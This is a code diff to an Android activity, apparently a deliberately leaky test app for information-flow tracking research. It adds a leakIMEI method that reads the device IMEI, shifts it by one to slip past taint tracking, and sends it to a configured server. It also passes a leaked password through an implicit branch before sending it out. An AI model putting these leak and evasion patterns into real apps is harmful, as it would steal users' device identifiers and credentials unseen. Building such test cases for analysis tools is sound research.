@@ -16,6 +16,7 @@ import android.support.v4.view.MenuItemCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
 import android.support.v7.widget.ShareActionProvider;
+import android.telephony.TelephonyManager;
 import android.text.method.ScrollingMovementMethod;
 import android.util.Log;
 import android.view.Menu;
@@ -39,6 +40,10 @@ public class Main extends AppCompatActivity {
     private LocationManager locationManager;
     private LocationListener locationListener;
     private final static int MY_PERMISSIONS_REQUEST = 1;
+    private final static String[] PERMS = new String[]{Manifest.permission.ACCESS_COARSE_LOCATION,
+            Manifest.permission.ACCESS_FINE_LOCATION,
+            Manifest.permission.INTERNET,
+            Manifest.permission.READ_PHONE_STATE};
 
     private String host;
     private Integer port;
@@ -54,6 +59,10 @@ public class Main extends AppCompatActivity {
 
         TextView tv = (TextView)findViewById(R.id.main_tv_log);
         tv.setMovementMethod(new ScrollingMovementMethod());
+
+        ActivityCompat.requestPermissions(this, PERMS, MY_PERMISSIONS_REQUEST);
+
+        tb = (ToggleButton)findViewById(R.id.main_tb_location);
     }
 
     @Override
@@ -99,7 +108,7 @@ public class Main extends AppCompatActivity {
 
 
     public void startStopGPS(View v){
-        tb = (ToggleButton)v;
+
         Log.d(TAG, "tb checked: " + tb.isChecked());
 
         if(tb.isChecked()){
@@ -114,9 +123,8 @@ public class Main extends AppCompatActivity {
 
                 //request the permission
                 Log.d(TAG, "Requesting permissions!");
-                ActivityCompat.requestPermissions(this,
-                        new String[]{Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.INTERNET},
-                        MY_PERMISSIONS_REQUEST);
+                ActivityCompat.requestPermissions(this, PERMS, MY_PERMISSIONS_REQUEST);
+
 
                 return;
 
@@ -138,7 +146,17 @@ public class Main extends AppCompatActivity {
         prependToLog("Leaked Password: " + pass);
 
         ServerLeakTask slt = new ServerLeakTask();
-        slt.execute(pass);
+
+        // Just to look at bytecode of implicit flows
+        if(pass.equals("password")){
+            String coded = "a";
+            slt.execute(coded);
+        } else{
+            slt.execute(pass);
+        }
+
+
+
     }
 
     @Override
@@ -147,15 +165,15 @@ public class Main extends AppCompatActivity {
             case MY_PERMISSIONS_REQUEST: {
                 // If request is cancelled, the result arrays are empty.
 
-                boolean flag = true;
+                boolean flag = false;
                 for(int res : grantResults){
                     if(res != PackageManager.PERMISSION_GRANTED){
-                        flag = false;
+                        flag = true;
                     }
                 }
 
                 if(flag){
-                    startLocationUpdates();
+                    Toast.makeText(this, "Some leaks may not be possible.", Toast.LENGTH_SHORT).show();
                 }
                 return;
             }
@@ -255,6 +273,36 @@ public class Main extends AppCompatActivity {
 
         ServerLeakTask slt = new ServerLeakTask();
         slt.execute(newPart);
+    }
+
+
+    public void leakIMEI(View v){
+        if (ContextCompat.checkSelfPermission(this ,
+                Manifest.permission.READ_PHONE_STATE)
+                != PackageManager.PERMISSION_GRANTED){
+            Toast.makeText(this, "Phone state permissions required!", Toast.LENGTH_SHORT).show();
+        } else {
+            TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+            String IMEI_STR = telephonyManager.getDeviceId();
+            Log.d(TAG, "Actual IMEI: "+ IMEI_STR);
+
+            // a little challenge for IFT
+            long imei = Long.parseLong(IMEI_STR);
+            imei = imei + 1;
+            IMEI_STR = String.valueOf(imei);
+            // challenge over
+
+
+
+            SimpleDateFormat mdformat = new SimpleDateFormat("HH:mm:ss");
+            String strDate = mdformat.format(Calendar.getInstance().getTime());
+            String newPart = "Leaked IMEI: (" + IMEI_STR + ") at " + strDate;
+            prependToLog(newPart);
+
+            ServerLeakTask slt = new ServerLeakTask();
+            slt.execute(IMEI_STR);
+        }
+
     }
 
     private void prependToLog(String newPart){
